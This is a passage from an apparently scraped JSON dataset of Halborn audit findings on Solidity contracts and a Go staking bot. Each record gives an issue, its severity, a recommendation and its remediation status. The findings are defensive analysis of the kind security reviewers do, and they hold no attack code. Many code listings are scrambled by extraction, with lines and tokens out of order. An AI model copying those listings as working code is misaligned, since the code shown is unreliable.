        "body": "The AddressStore contract use Ownable from OpenZeppelin which is a simple mechanism to transfer the ownership not supporting a two-step transfer ownership pattern. Ownable is a simpler mechanism with a single owner role that can be assigned to a single account. This simpler mechanism can be useful for quick tests, but projects with production concerns are likely to outgrow it. Transferring ownership is a critical operation and this could lead to transferring it to an inaccessible wallet or renouncing the ownership, e.g. mistakenly. Code Location: AddressStore Contract Listing 9: AddressStore.sol 8 contract AddressStore is IAddressStore , Ownable Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to implement a two-step transfer of ownership mechanism where the ownership is transferred and later claimed by a new owner to confirm the whole process and prevent lockout. As OpenZeppelin ecosystem does not provide such implementation, it has to be done in-house. For the 22 inspiration BoringOwnable can be considered, however it has to be well tested, especially if it is integrated with other OpenZeppelin contracts used by the project. References - Access Control - BoringOwnable.sol Remediation Plan: SOLVED: The persistenceOne team does not require a fix for this, as the platform will use a multi-signature wallet when developed on production. 23 ",
        "labels": [
            "Halborn",
            "Persistence_StkBNB",
            "Severity: Informational"
        ]
    },
    {
        "title": "STORING VARIABLE CAN SAVE GAS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Persistence_StkBNB_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Calling a contract, although a view function, still requires some gas from the contract. The UndelegationHolder contract performs the call to the StakePool contract twice instead of storing the result on a variable. Risk Level: Likelihood - 1 Impact - 1 Code Location: UndelegationHolder contract Listing 10: UndelegationHolder.sol 66 if ( amountToSend > IStakePoolBot ( stakePool ). bnbUnbonding () ) { 67 68 } amountToSend = IStakePoolBot ( stakePool ). bnbUnbonding () ; Recommendation: Store the result of the function call in a variable and use the stored value in subsequent operations. Remediation Plan: SOLVED: The persistenceOne team fixed the above issue on the commit ID d059bccbb368158a63767107b37894d47009c385. 24 ",
        "labels": [
            "Halborn",
            "Persistence_StkBNB",
            "Severity: Informational"
        ]
    },
    {
        "title": "ADDING UNCHECKED DIRECTIVE CAN SAVE GAS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Persistence_StkBNB_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "For the arithmetic operations that will never over/underflow, using the unchecked directive (Solidity v0.8 has default overflow/underflow checks) can save some gas from the unnecessary internal over/underflow checks. Risk Level: Likelihood - 1 Impact - 1 Code Location: StakePool contract Listing 11: StakePool.sol 539 _TOKEN_HUB . transferOut { value : excessBNB }( 540 541 542 543 544 ); _ZERO_ADDR , config . bcStakingWallet , transferOutAmount , uint64 ( block . timestamp + 3600) Recommendation: Using the unchecked keyword to avoid redundant arithmetic checks and save gas when an underflow/overflow cannot happen. 25 Remediation Plan: ACKNOWLEDGED: The persistenceOne team acknowledged this issue. 26 ",
        "labels": [
            "Halborn",
            "Persistence_StkBNB",
            "Severity: Informational"
        ]
    },
    {
        "title": "PREFIX INCREMENTS ARE CHEAPER THAN POSTFIX INCREMENTS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Persistence_StkBNB_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The function getPaginatedClaimRequests uses i++ which costs more gas than ++i, especially in a loop. In the loops below, postfix (e.g. i++) operators were used to increment or decrement variable values. It is known that, in loops, using prefix operators (e.g. ++i) costs less gas per iteration than using postfix operators. Risk Level: Likelihood - 1 Impact - 1 Code Location: StakePool Contract Listing 12: StakePool.sol 722 for ( uint256 i = 0; i < to - from ; i ++) { 723 724 } paginatedClaimRequests [ i] = claimReqs [ user ][ from + i ]; Recommendation: It is recommended to use unchecked ++i and --j operations instead of i++ and j-- to increment or decrement the values of uint variables within loops. This applies not only to iterator variables, but also to increments and decrements performed within loop code blocks. 27 Remediation Plan: SOLVED: The persistenceOne team fixed the above issue on the commit ID d059bccbb368158a63767107b37894d47009c385. 28 ",
        "labels": [
            "Halborn",
            "Persistence_StkBNB",
            "Severity: Informational"
        ]
    },
    {
        "title": "BOT INCONSISTENTLY CAN FAIL DUE TO MISSING CHECK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/A41_SuperNova_Bot_Golang_Security_Audit_Report_Halborn_Final.pdf",
        "body": "On the SuperNova Bot, several actions can be completed through the binary. In the Supernova protocol, The oracle module manages the status of the zones associated. The status includes the amount of coins delegated to the Zones Validator, block height, proof. With UpdateChainState message, oracle module updates the status of the zones stored in Oracle with a new status. In the SuperNova Bot, Transaction error is not defined for UpdateChainState message by the BOT. The bot can fail silently due to missing control. Code Location: /logic/router.go#L11 Listing 1 case config . ActStake : initialBanner ( botType ) switch botType { case config . ActOracle : cq := query . NewCosmosQueryClient ( hci . GrpcAddr ) defer utils . CloseGrpc ( cq . ClientConn ) UpdateChainState ( cq , b , hci ) 1 func RouteBotAction ( botType string , b * basetypes . Bot , cni * config .  ChainNetInfo , hci * config . HostChainInfo ) { 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 cq := query . NewCosmosQueryClient ( hci . GrpcAddr ) nq := novaq . NewNovaQueryClient ( cni . GRPC . Host ) defer utils . CloseGrpc ( cq . ClientConn ) defer utils . CloseGrpc ( nq . ClientConn ) IcaAutoStake (cq , nq , b , hci ) nq := novaq . NewNovaQueryClient ( cni . GRPC . Host ) defer utils . CloseGrpc ( nq . ClientConn ) IcaStake ( nq , b , hci ) case config . ActAutoStake : case config . ActWithdraw : 14 cq := query . NewCosmosQueryClient ( hci . GrpcAddr ) nq := novaq . NewNovaQueryClient ( cni . GRPC . Host ) defer utils . CloseGrpc ( cq . ClientConn ) defer utils . CloseGrpc ( nq . ClientConn ) UndelegateAndWithdraw (cq , nq , b , hci ) default : panic ( \" This type cannot handle at this action router \") 19 20 21 22 23 24 25 26 Risk Level: Likelihood - 3 Impact - 5 Proof Of Concept: Listing 2 addr := sdk . AccAddress ([] byte ( \" addr________________ \" )) sdk . NewCoin (\" atom \" , sdk . NewInt (1000) ) , addr . String () , msg := MsgUpdateChainState { Coin : Operator : BlockHeight : 10 , AppHash : ZoneId : 1 func TestMsgUpdateChainStateValidation ( t * testing .T ) { 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 } // check invalid address msg . Operator = \" invalid \" err = msg . ValidateBasic () require . Error (t , err ) } err := msg . ValidateBasic () require . NoError (t , err ) [] byte ( \" apphash \" ) , \" cosmos \" , /client/base/bot.go#L88 15 Listing 3 return NEXT return NEXT \" , ut . KEEP ) if e != nil { There is no asset to There is no reward to utils . LogErrWithFd (f , e , \" utils . LogErrWithFd (f , e , \" utils . LogErrWithFd (f , e , \" go to next batch \\ n\" , ut . KEEP ) go to next batch \\n \" , ut . KEEP ) } else if strings . Contains ( e. Error () , \" no coins to } else if strings . Contains ( e. Error () , \" invalid coins \") { } else if strings . Contains ( e. Error () , \" cannot change state if strings . Contains ( e . Error () , \" account sequence mismatch \" utils . LogErrWithFd (f , e , \" return SEQMISMATCH 1 func handleTxErr ( f * os . File , e error ) TxErr { 2 3  ) { 4 5 6  \" ) { 7  delegate on this host zone 8 9 10  autostake on this host zone 11 12  undelegate \" ) { 13  undelegate on this host zone 14 15  funds \" ) { 16  withdraw on this host zone 17 18  height must be higher than the previous block height \" ) { 19  due to the oracle bot 's update . It will regenerate tx \\ n\" , ut . KEEP ) 20 21 22 23  generate tx \" , ut . KEEP ) 24 25 26 27 } There is no asset to go to next batch \\ n \" , ut . KEEP ) } else if strings . Contains ( e. Error () , \" cannot withdraw } else if strings . Contains ( e. Error () , \" current block go to next batch \\ n\" , ut . KEEP ) } return NONE utils . LogErrWithFd (f , e , \" utils . LogErrWithFd (f , e , \" utils . LogErrWithFd (f , e , \" something went wrong while oracle info was outdated There is no asset to return NORMAL return REPEAT return NEXT return NEXT } 16 Recommendation: Make sure all errors are handled in transactions. Listing 4 ErrUnknown ErrNotFoundZoneInfo = sdkerrors . Register ( ModuleName , 2, \" = sdkerrors . Register ( ModuleName , 1, \" = sdkerrors . Register ( ModuleName , 0, \" 1 var ( 2 ErrNoSupportChain  this chain is not supported \" ) 3 ErrInvalidOperator  invalid operator address \" ) 4  unknown error \" ) 5  not found zone info \" ) 6 ErrInvalidKeyManager  invalid key manager address \" ) 7  blockHeight must be positive \" ) 8 ErrInvalidBlockHeight  current block height must be higher than the previous block height  . \") 9 ) ErrNegativeBlockHeight = sdkerrors . Register ( ModuleName , 5, \" = sdkerrors . Register ( ModuleName , 6, \" = sdkerrors . Register ( ModuleName , 4, \" = sdkerrors . Register ( ModuleName , 3, \" Remediation Plan: SOLVED: The A41 team solved the issue in commit a6a44a376 by adding the error messages. 17 ",
        "labels": [
            "Halborn",
            "A41_SuperNova_Bot_Golang",
            "Severity: High"
        ]
    },
    {
        "title": "LACK OF ERROR CHECKS CAN LEADS TO UNEXCEPTED FAILURES ON THE BOT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/A41_SuperNova_Bot_Golang_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the SuperNova Bot, the following actions can be completed through the bot. Listing 5 1 oracle : Update host 's base token price every 15 minutes . 2 3 withdraw : Undelegate and withdraw token from host account to nova  . The interval depends on the rules of the host chain . 4 5 stake : Delegate the tokens sent by the user to the host chain via  IBC to the a4x validator through the controller account every 10  mintues . 6 7 restake : Automatically re - stake the host account 's rewards  through IBC . The amount to be re - deposited is inquired from the  distribution module of the host chain every 6 hours . There are some instances where error handling has not been implemented for the functions that might return an error. Without the error handling, the operations can silently fail and cant continue the workflow. Code Location: /logic/tx.go#L82-L157 Listing 6 1 func UpdateChainState ( cq * query . CosmosQueryClient , b * novatypes .  Bot , host * config . HostChainInfo ) { 2 3 i := 0 intv := time . Duration ( b. Interval ) 18 } } for { _ = mustExecTx (b , host , msgs ) _ = mustExecTx (b , host , msgs , IBCConfirm { nq , config . _ = mustExecTx (b , host , msgs , IBCConfirm { nq , config . 4 5 6 7 } 8 9 func IcaAutoStake ( cq * query . CosmosQueryClient , nq * novaq .  NovaQueryClient , b * novatypes . Bot , host * config . HostChainInfo ) { 10 ... 11  ActAutoStake , targetSeq }) 12 ... 13 14 15 func IcaAutoStake ( cq * query . CosmosQueryClient , nq * novaq .  NovaQueryClient , b * novatypes . Bot , host * config . HostChainInfo ) { 16 ... 17  ActAutoStake , targetSeq }) 18 ... 19 20 21 func IcaStake ( nq * novaq . NovaQueryClient , b * novatypes . Bot , host *  config . HostChainInfo ) { 22 ... 23  ActStake , targetSeq }) 24 ... 25 26 27 func UndelegateAndWithdraw ( cq * query . CosmosQueryClient , nq * novaq .  NovaQueryClient , b * novatypes . Bot , host * config . HostChainInfo ) { 28 ... 29  ActWithdraw , wdSeq }) 30 ... 31 _ = mustExecTx (b , host , msgs , IBCConfirm { nq , config . _ = mustExecTx (b , host , msgs , IBCConfirm { nq , config . }() } } Risk Level: Likelihood - 3 Impact - 5 19 Proof Of Concept: Listing 7 addr := sdk . AccAddress ([] byte ( \" addr________________ \" )) sdk . NewCoin (\" atom \" , sdk . NewInt (1000) ) , addr . String () , msg := MsgUpdateChainState { Coin : Operator : BlockHeight : 10 , AppHash : ZoneId : 1 func TestMsgUpdateChainStateValidation ( t * testing .T ) { 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 } // check invalid address msg . Operator = \" invalid \" err = msg . ValidateBasic () require . Error (t , err ) } err := msg . ValidateBasic () require . NoError (t , err ) [] byte ( \" apphash \" ) , \" cosmos \" , Recommendation: It is recommended to implement proper error checking to avoid unexpected crashes. Remediation Plan: SOLVED: The A41 team solved the issue in commit a6a44a376 by adding the error checks. 20 ",
        "labels": [
            "Halborn",
            "A41_SuperNova_Bot_Golang",
            "Severity: High"
        ]
    },
    {
        "title": "ReadHeaderTimeout IS NOT SET IN THE HTTP SERVE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/A41_SuperNova_Bot_Golang_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Slowloris is a type of denial of service (DoS) attack tool which allows a single machine to take down another machines web server with minimal bandwidth and side effects on unrelated services and ports. Slowloris tries to keep many connections to the target web server open and hold them open as long as possible. It accomplishes this by opening connections Configuring to the target web server and sending a partial request. ReadHeaderTimeout would protect directly against this attack by closing the connection once the deadline is reached. By default, Go does not define any value meaning there is no timeout. Code Location: /api/server.go#L54 Listing 8 1 func ( s Server ) On ( addr string ) { 2 3 4 5 6 7 } 8 http . Handle (\" / metrics \" , promhttp . Handler () ) http . Handle (\" / check /\" , NewChkHandler () ) err := http . ListenAndServe ( addr , nil ) utils . CheckErr ( err , \" cannot open http server \" , ut . EXIT ) Risk Level: Likelihood - 3 Impact - 3 21 Proof Of Concept: Recommendation: It is recommended to define ReadHeaderTimeout in the API. Remediation Plan: SOLVED: The A41 team solved the issue in commit 5165f8b7e by adding ReadHeaderTimeout in the API. 22 ",
        "labels": [
            "Halborn",
            "A41_SuperNova_Bot_Golang",
            "Severity: Medium"
        ]
    },
    {
        "title": "IBC TIMEOUT IS NOT COMPATIBLE WITH THE CHAIN",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/A41_SuperNova_Bot_Golang_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the codebase, it is mentioned as This value must be set higher than the IBC timeout, but the value is incompatible with SuperNova Chain. The incompatibility can lead to error on the transaction generation. Code Location: /logic/params.go#L9 Listing 9 \" time \" 1 package logic 2 3 import ( 4 5 ) 6 7 const ( 8 9  higher than the ibc timeout . 10 ) 11 12 const ( 13 14 ) 15 QueryErrPrefix = \" [ QUERY ERROR ] : \" ReQueryDelay = time . Second * 1 IBCDelay = time . Second * 30 // This value must be set Risk Level: Likelihood - 1 Impact - 3 23 Recommendation: Ensure that IBCDelay is compatible with SuperNova Chain. Remediation Plan: SOLVED: The A41 team solved the issue in commit 41700f77 by adding IBC Timeout as a flag. 24 ",
        "labels": [
            "Halborn",
            "A41_SuperNova_Bot_Golang",
            "Severity: Low"
        ]
    },
    {
        "title": "TEST DOCKER IMAGE RUNNING AS ROOT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/A41_SuperNova_Bot_Golang_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Docker containers generally run with root privileges by default. This allows for unrestricted container management, meaning a user could in- stall system packages, edit configuration files, bind privileged ports, etc. During static analysis, it was observed that the docker image is maintained through the root user. Code Location: Dockerfile Listing 10 1 FROM golang :1.19 - alpine AS builder 2 3 FROM builder AS builder - amd64 4 ARG arch = x86_64 5 6 FROM builder AS builder - arm64 7 ARG arch = aarch64 8 9 FROM builder - $TARGETARCH AS release 10 RUN set - eux ; apk add --no - cache ca - certificates build - base ; 11 RUN apk add git 12 ARG GHTOKEN 13 RUN git config -- global url . \" https :// $GHTOKEN@github . com / \".  insteadOf \" https :// github . com /\" && go env -w GOPRIVATE = github . com /  Carina - labs 14 WORKDIR / workspace 15 COPY . . 16 ADD https :// github . com / CosmWasm / wasmvm / releases / download / v1 .1.1/  libwasmvm_muslc . aarch64 .a / lib / libwasmvm_muslc . aarch64 .a 17 ADD https :// github . com / CosmWasm / wasmvm / releases / download / v1 .1.1/  libwasmvm_muslc . x86_64 . a / lib / libwasmvm_muslc . x86_64 . a 18 RUN sha256sum / lib / libwasmvm_muslc . aarch64 . a | grep 9  ecb037336bd56076573dc18c26631a9d2099a7f2b40dc04b6cae31ffb4c8f9a 25 19 RUN sha256sum / lib / libwasmvm_muslc . x86_64 . a | grep 6  e4de7ba9bad4ae9679c7f9ecf7e283dd0160e71567c6a7be6ae47c81ebe7f32 20 RUN cp / lib / libwasmvm_muslc . $ { arch }. a / lib / libwasmvm_muslc . a 21 RUN LINK_STATICALLY = true make build 22 23 FROM alpine :3.16 24 RUN apk add -- update --no - cache 25 ENV TARGET = hal 26 ENV PATH = \"$ { PATH }:/ workspace \" 27 WORKDIR / workspace 28 COPY -- from = release / workspace / build / $TARGET ./ $TARGET 29 # comment out below if you need config dynamic linking 30 COPY . chaininfo . yaml . secret . yaml ./ config / 31 CMD [\" hal \" , \" -- help \" ] ca - certificates libstdc ++ yq Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to build the Dockerfile and run the container as a non-root user. Listing 11: Reference 1 USER 1001: this is a non - root user UID , and here it is assigned to  the image to run the current container as an unprivileged user .  By doing so , the added security and other restrictions mentioned  above are applied to the container . Remediation Plan: SOLVED: The A41 team solved the issue in commit 273c89b by changing user on the Dockerfile. 26 ",
        "labels": [
            "Halborn",
            "A41_SuperNova_Bot_Golang",
            "Severity: Low"
        ]
    },
    {
        "title": "USE OF WEAK RANDOM GENERATOR",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/A41_SuperNova_Bot_Golang_Security_Audit_Report_Halborn_Final.pdf",
        "body": "When a non-cryptographic PRNG is used in a cryptographic context, it can expose the cryptography to certain types of attacks. Often a pseudo-random number generator (PRNG) is not designed for cryptography. Sometimes a poor source of randomness is enough or preferable for algorithms that use random numbers. Weak generators generally take less processing power and/or do not use the precious, finite, entropy sources on a system. While such PRNGs might have very useful features, these same features could be used to break the cryptography. Code Location: /rpc/types/ws.go#L8-L9 Risk Level: Likelihood - 2 Impact - 2 Recommendation: Consider replacing math/rand with crypto/rand. Remediation Plan: SOLVED: The A41 team solved the issue in commit 138541f by using crypto /rand. 27 ",
        "labels": [
            "Halborn",
            "A41_SuperNova_Bot_Golang",
            "Severity: Low"
        ]
    },
    {
        "title": "SECRET YAML SHOULD BE ADDED INTO GIT IGNORE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/A41_SuperNova_Bot_Golang_Security_Audit_Report_Halborn_Final.pdf",
        "body": ".secret.yml is used to pipe keyring password. A gitignore file specifies intentionally untracked files that Git should ignore. All sensitive information should be added into the gitignore to prevent commit into repository. Code Location: /.secret.yaml Listing 12: Reference 1 pw : masked Risk Level: Likelihood - 2 Impact - 2 Recommendation: Consider removing .secret.yml and adding it to .gitignore. Remediation Plan: SOLVED: The A41 team solved the issue in commit 8cc34a0d by adding . secret.yml into .gitignore. 28 ",
        "labels": [
            "Halborn",
            "A41_SuperNova_Bot_Golang",
            "Severity: Low"
        ]
    },
    {
        "title": "HARDCODED USE OF INSECURE GRPC TRANSPORT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/A41_SuperNova_Bot_Golang_Security_Audit_Report_Halborn_Final.pdf",
        "body": "During the code review, it was noted that gRPC client uses a hardcoded WithInsecure() transport setting when dialing a remote. This could allow man-in-the-middle attacks between the gRPC client and server. Code Location: /client/nova/query/querier.go#L30 Listing 13 conn , err := grpc . Dial ( grpcAddr , grpc . WithInsecure () , 1 func NewNovaQueryClient ( grpcAddr string ) * NovaQueryClient { 2 3 4 5 6 7 8 } ) utils . CheckErr ( err , \" cannot create gRPC connection \" , 0) return & NovaQueryClient { conn } Risk Level: Likelihood - 1 Impact - 3 Recommendations: In the short term, add documentation that explains to end users the simplest mechanism to secure gRPC. In the long term, consider adding a configuration option that allows you to select gRPC transport as secure or non-secure, where secure transport is the default. 29 Remediation Plan: SOLVED: The A41 team solved the issue in commit 576ac33 by adding secure option. 30 ",
        "labels": [
            "Halborn",
            "A41_SuperNova_Bot_Golang",
            "Severity: Low"
        ]
    },
    {
        "title": "LACK OF EXTENSIVE TEST COVERAGE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/A41_SuperNova_Bot_Golang_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Adequate test coverage and regular reporting is an essential process to ensure the codebase works as intended. Insufficient code coverage can lead to unexpected issues and regressions due to changes in module implementations. Code Location: SuperNova Bot Recommendation: Make sure the coverage report produced via go test -cover covers all functions. Remediation Plan: ACKNOWLEDGED: The A41 team acknowledged this issue. 31 3.10 (HAL-10) OPEN TODO IN CODEBASE - INFORMATIONAL ",
        "labels": [
            "Halborn",
            "A41_SuperNova_Bot_Golang",
            "Severity: Informational"
        ]
    },
    {
        "title": "IMPROPER KEY MANAGEMENT POLICY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pera_Finance_SmartContract_Halborn_report_v1_1.pdf",
        "body": "A fundamental principle of blockchain is decentralization which should be applied as widely as possible in all areas, including key management. Using a single private key to manage a smart contract and perform privi- leged actions such as deploying or upgrading the contract is risky. If the private key is compromised, it could have devastating consequences. For example, on March 5, 2021, the PAID Network smart contract was suc- cessfully attacked despite the smart-contract being previously audited. Approximately $100 million of PAID tokens were extracted by the attacker. In that case, the private key was compromised and the attacker upgraded and replaced the original smart contract with a malicious version that allowed tokens to be burned and minted. Had best practices been imple- mented in the key management policy, the attacker could not have upgraded the contract using a single private key. Requiring multiple signatures in the key-management policy prevents a single user from performing any critical actions. Reference: https://halborn.com/explained-the-paid-network-hack-march -2021/ Risk Level: Likelihood - 5 Impact - 5 Recommendations: Require multiple signatures in the key-management policy to avoid a private-key compromise resulting in loss of control over the smart con- tract. 13 Remediation Plan: SOLVED: Pera.Finance Team will use a multi-signature wallet for the deployment to the mainnet. 14 ",
        "labels": [
            "Halborn",
            "Pera_Finance_SmartContract_Halborn_report_v1_1",
            "Severity: Critical"
        ]
    },
    {
        "title": "IMPROPER ROLE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pera_Finance_SmartContract_Halborn_report_v1_1.pdf",
        "body": "Implementing a valid access control policy is an essential step in main- taining the security of a smart contract. Access to smart-contract features, such as minting or burning tokens, and pausing contracts, are protected by access control. For instance, ownership is the most common form of access control. By default, the owner of a contract (the account that deployed it) can perform administrative tasks on the contract. Ad- ditional authorization levels are needed to implement the least privilege principle, also known as least-authority, which ensures only authorized processes, users, or programs can access the necessary resources or in- formation. The ownership role is helpful in a simple system, but more complex projects require more roles by using role-based access control. There should be multiple roles such as manager, minter, admin, or pauser in contracts that use a proxy contract. In the pera.sol contract, manager is the only privileged role. Manager can transfer the contract ownership, include/exclude accounts and call addLPToken() function. In conclusion, the manager role can perform too many privileged actions in the PERA smart contract. If the private key of the manager account is compromised and multi-signature was not implemented, the attacker can perform many actions such as transferring ownership or whitelist- ing/blacklisting the contract without following the principle of least privilege. Code Location: Manager role can access below functions: pera.sol Lines #173-179 15 pera.sol Lines #180-186 pera.sol Lines #187-199 pera.sol Lines #555-560 Listing 1 1 function transferOwnership ( address newOwner ) public 2 function excludeAccount ( address account ) public 3 function includeAccount ( address account ) public 4 function addLPToken ( address _addr ) public 16 Risk Level: Likelihood - 4 Impact - 4 Recommendation: We recommend using role-based access control, based upon the principle of least privilege, to lock permissioned functions using different roles. Reference:https://www.cyberark.com/what-is/least-privilege/ Remediation Plan: SOLVED: Pera.Finance Team will use a multi-signature wallet for the deployment to the mainnet. 17 ",
        "labels": [
            "Halborn",
            "Pera_Finance_SmartContract_Halborn_report_v1_1",
            "Severity: High"
        ]
    },
    {
        "title": "NO TEST COVERAGE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pera_Finance_SmartContract_Halborn_report_v1_1.pdf",
        "body": "Unlike traditional software, smart contracts can not be modified unless deployed using a proxy contract. Because of the permanence, unit tests and functional testing are recommended to ensure the code works correctly Mocha and Chai are valuable tools to perform unit before deployment. tests in smart contracts. Mocha is a Javascript testing framework for creating synchronous and asynchronous unit tests, and Chai is a library with assertion functionality such as assert or expect and should be used to develop custom unit tests. References: https://github.com/mochajs/mocha https://github.com/chaijs/chai https://docs.openzeppelin.com/learn/writing-automated-tests Risk Level: Likelihood - 3 Impact - 3 Recommendation: We recommend performing as many test cases as possible to cover all conceivable scenarios in the smart contract. 18 Remediation Plan: UNCOVERED: Pera.Finance Team is prepared manual test coverage documenta- tion. 19 ",
        "labels": [
            "Halborn",
            "Pera_Finance_SmartContract_Halborn_report_v1_1",
            "Severity: Medium"
        ]
    },
    {
        "title": "FLOATING PRAGMA",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pera_Finance_SmartContract_Halborn_report_v1_1.pdf",
        "body": "The Pera.Finance contract uses a floating pragma 0.7.5. Contracts should be deployed with the same compiler version and flags with which they have been tested. Locking the pragma helps ensure that contracts do not accidentally get deployed using, for example, either an outdated compiler version that might introduce bugs that negatively affect the contract system or a pragma version too new that has not been extensively tested. Code Location: pera.sol Line #~1 Reference: https://consensys.github.io/smart-contract-best-practices/ recommendations/#lock-pragmas-to-specific-compiler-version Risk Level: Likelihood - 2 Impact - 3 Recommendation: Consider locking the pragma version whenever possible and avoid using The pragma can be locked a floating pragma in the final deployment. in the code by removing the caret () and by specifying the version in the Truffle configuration file truffle-config.js or hardhat.config.js if using the HardHat framework. 20 truffle-config.js hardhat.config.js Remediation Plan: SOLVED: Pera.Finance Team locked Pragma Version to 0.6.12 21 ",
        "labels": [
            "Halborn",
            "Pera_Finance_SmartContract_Halborn_report_v1_1",
            "Severity: Low"
        ]
    },
    {
        "title": "POSSIBLE RE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pera_Finance_SmartContract_Halborn_report_v1_1.pdf",
        "body": "Calling external contracts is dangerous if functions or variables are used after the external call. The transfer function is executed before checking the totalRewards value, potentially allowing an attacker to hijack the control flow using an external contract implementing a recursive call. Code Location: contract.sol Line #526-545 Risk Level: Likelihood - 2 Impact - 3 Recommendation: External calls should be at the end of the function to prevent an attacker from taking over the control flow. Check the totalRewards before calling the transfer function. The totalStakedLP and usersLP variables should be called before invoking _transfer(address(this), msg.sender, usershareLP 22 .div(decimalLossLP));. Remediation Plan: SOLVED: External calls have been moved to the end by the Pera.Finance Team. 23 ",
        "labels": [
            "Halborn",
            "Pera_Finance_SmartContract_Halborn_report_v1_1",
            "Severity: Low"
        ]
    },
    {
        "title": "DIVIDE BEFORE MULTIPLY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pera_Finance_SmartContract_Halborn_report_v1_1.pdf",
        "body": "In Solidity, integer division might truncate. Performing multiplication before division can sometimes avoid a loss of precision. In this au- dit, multiple instances were found where division is performed before multiplication in the contract. Code Location: contract.sol Line #533 Risk Level: Likelihood - 2 Impact - 3 Recommendation: Perform multiplication operations before division to preserve the preci- sion of values for non-floating data types. A sample solution is provided below. 24 Listing 2 1 ERC20 ( lpTokenAddress ). transfer ( msg . sender , ( usersLP [ msg . sender ]. liq . mul (96) ). div (100) ); 25 Remediation Plan: SOLVED: In the updated contract code, the Multiplication operation is performed before division. ",
        "labels": [
            "Halborn",
            "Pera_Finance_SmartContract_Halborn_report_v1_1",
            "Severity: Low"
        ]
    },
    {
        "title": "PRAGMA VERSION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pera_Finance_SmartContract_Halborn_report_v1_1.pdf",
        "body": "Pera.Finance contract uses one of the latest pragma version (0.7.5) which was released on November 18, 2020. The latest pragma version (0.8.2) was released in March 2021. Many pragma versions have been lately released, going from version 0.6.x to the recently released version 0.8.x. in just 6 months. Reference: https://github.com/ethereum/solidity/releases Code Location: pera.sol Line #~1 Risk Level: Likelihood - 1 Impact - 3 Recommendation: In the Solitidy Github repository, there is a json file where are all bugs finding in the different compiler versions. No bugs have been found in > 0.7.3 versions but very few in 0.7.0 -- 0.7.3. So, the latest tested and stable version is pragma 0.6.12. Furthermore, pragma 0.6.12 26 is widely used by Solidity developers and has been extensively tested in many security audits. Reference: https://github.com/ethereum/solidity/blob/develop/docs/ bugs_by_version.json SOLVED: Pera.Finance Team locked Pragma Version to 0.6.12 27 ",
        "labels": [
            "Halborn",
            "Pera_Finance_SmartContract_Halborn_report_v1_1",
            "Severity: Low"
        ]
    },
    {
        "title": "FOR LOOP OVER DYNAMIC ARRAY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pera_Finance_SmartContract_Halborn_report_v1_1.pdf",
        "body": "When smart contracts are deployed or functions inside them are called, the execution of these actions always requires a certain amount of gas, based on how much computation is needed to complete them. The Ethereum network specifies a block gas limit and the sum of all transactions included in a block cannot exceed the threshold. Programming patterns that are harmless in centralized applications can lead to Denial of Service conditions in smart contracts when the cost of executing a function exceeds the block gas limit. Modifying an array of unknown size, that increases in size over time, can lead to such a Denial of Service condition. A situation in which the block gas limit can be an issue is in sending funds to an array of addresses. Even without any malicious intent, this can easily go wrong. Just by having too large an array of users to pay can max out the gas limit and prevent the transaction from ever succeeding. Code Location: pera.sol Line #~189 pera.sol Line #~200 28 pera.sol Line #~265 pera.sol Line #~291 pera.sol Line #~322-323 29 pera.sol Line #~342 pera.sol Line #~351 pera.sol Line #~487 Risk Level: Likelihood - 1 Impact - 3 Recommendation: Actions that require looping across the entire data structure should be avoided. If you absolutely must loop over an array of unknown size, then you should plan for it to potentially take multiple blocks, and therefore require multiple transactions. 30 SOLVED: Pera.Finance Team completed changes to reduce the number of cycles. 31 ",
        "labels": [
            "Halborn",
            "Pera_Finance_SmartContract_Halborn_report_v1_1",
            "Severity: Low"
        ]
    },
    {
        "title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pera_Finance_SmartContract_Halborn_report_v1_1.pdf",
